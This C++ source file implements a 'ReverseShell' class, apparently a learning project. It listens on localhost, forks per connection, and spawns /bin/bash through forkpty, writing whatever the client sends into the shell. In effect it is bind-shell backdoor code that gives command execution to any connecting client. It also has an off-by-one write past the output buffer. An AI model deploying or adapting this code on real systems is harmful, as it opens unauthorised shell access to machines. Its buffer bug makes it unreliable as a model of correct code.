#include "ReverseShell.hpp"
#include "Connection.hpp"
#include <unistd.h>
#include <signal.h>
#include <util.h>
#include <list>
#include <sys/select.h>

ReverseShell::ReverseShell(void)
{
	Connection								c("127.0.0.1");
	std::list< std::pair< pid_t, int > >	clientProcesses;
	int										status;

	c.Bind();

	c.Listen();

	while (42)
	{
		int serverSocket = c.Accept();
		std::cout << "Accept !" << std::endl;
		pid_t	pid;

		if ((pid = fork()) == 0)
		{
			_RunShell(serverSocket);
			exit(0);
		}

		clientProcesses.push_back(std::pair< pid_t, int >(pid, serverSocket));

		for (const auto p : clientProcesses)
			if (waitpid(std::get< 0 >(p), &status, WNOHANG) > 0)
				close(std::get< 1 >(p));
	}
}

void		ReverseShell::_RunShell(int serverSocket) noexcept
{
	pid_t	shellPid;
	int		shellFd;
	fd_set	read_fds;
	fd_set	active_fds;

	if ((shellPid = forkpty(&shellFd, NULL, NULL, NULL)) == 0)
	{
		setsid();
		exit(execl("/bin/bash", "bash", NULL));
	}

	std::cout << "shellFd: " << shellFd << "\n";
	std::cout << "shellFd: " << serverSocket<< "\n";

	FD_ZERO(&active_fds);
	FD_SET(serverSocket, &active_fds);
	FD_SET(shellFd, &active_fds);

	while (42)
	{
		read_fds = active_fds;

		if (select(FD_SETSIZE, &read_fds, NULL, NULL, NULL) < 0)
			std::cout << "select: " << strerror(errno) << std::endl, exit(-1);

		for (int i = 0; i < FD_SETSIZE; i++)
			if (FD_ISSET(i, &read_fds))
			{
				if (i == serverSocket)
					_ReadFromServer(shellPid, shellFd, serverSocket);
				else
					_ReadFromShell(shellFd);
			}


	}
}

void		ReverseShell::_ReadFromServer(int shellPid, int shellFd, int serverSocket) noexcept
{
	char	cmd[0xF00];
	long	r;
	int		status;

	r = read(serverSocket, cmd, sizeof(cmd));

	if (r <= 0)
	{
		if (r != 0)
			perror("read");

		close(serverSocket);

		kill(shellPid, SIGKILL);
		waitpid(shellPid, &status, 0);
		exit(0);
	}

	write(shellFd, cmd, r);
}

void		ReverseShell::_ReadFromShell(int shellFd) noexcept
{
	char	output[0xF00];
	long	r;

	r = read(shellFd, output, sizeof(output));

	if (r == -1)
	{
		perror("read");
		return ;
	}

	output[r] = 0;

	std::cout << "output: [" << output << "]" << ", length: " << r << std::endl;
}

std::ostream &	operator<<(std::ostream & o, ReverseShell const & r)
{
	o << "tostring of the class" << std::endl;
	(void)r;
	return (o);
}
